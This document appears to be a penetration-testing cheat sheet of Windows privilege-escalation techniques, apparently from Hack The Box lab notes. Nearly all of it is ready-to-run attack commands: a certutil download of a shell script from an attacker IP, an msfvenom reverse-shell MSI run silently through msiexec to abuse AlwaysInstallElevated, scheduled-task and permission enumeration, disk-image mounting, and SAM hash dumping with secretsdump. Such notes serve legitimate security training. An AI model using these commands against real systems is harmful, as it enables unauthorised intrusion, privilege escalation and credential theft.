# Miscellaneous Techniques

## LOLBAS — certutil.exe

```bash
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```

---

## Always Install Elevated

### Check Registry Keys

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

### Create Malicious MSI

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

### Execute MSI

```powershell
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

---

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

---

## User / Computer Description Field

```powershell
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

---

## Mount VHDX / VMDK (Linux)

```bash
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

## Retrieving Hashes (Linux)

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
